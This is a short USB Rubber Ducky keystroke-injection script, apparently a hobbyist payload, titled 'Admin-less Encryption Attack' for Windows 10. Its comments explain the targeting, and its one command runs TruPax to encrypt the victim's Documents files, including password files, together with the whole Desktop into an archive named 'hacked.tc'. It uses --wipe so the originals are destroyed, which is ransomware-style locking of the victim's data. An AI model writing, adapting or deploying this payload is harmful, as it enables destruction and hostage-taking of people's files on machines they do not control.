REM Admin-less Encryption Attack
REM Designed for Windows 10
REM Requires a USB with TruPax, either a seperate one or, ideally, the Rubber Ducky running Twin Duck

REM Now we have %duckyd% as whatever the TruPax drive letter is on this system
REM Remember, current directory is %USERPROFILE%
REM Remove --wipe while testing timing
REM Using TruPax, encrypt files in documents folder that use common file extensions
REM Because this does not search subfolders (due to wildcard name) try a few more specific searches as well
REM In my experience, people love storing all their sensitive data on their desktop, so we grab that too
REM Sadly, snatching the entire Documents takes too long, so we'll settle for just these for now
STRING %duckyd%\TruPax9C\trupax.cmd -r -v --wipe --skip-empty-dirs --store-full-path %USERPROFILE%\hacked.tc Documents\*.csv Documents\*.docx Documents\*.txt Documents\*.xlsx Documents\pass*.* Desktop\
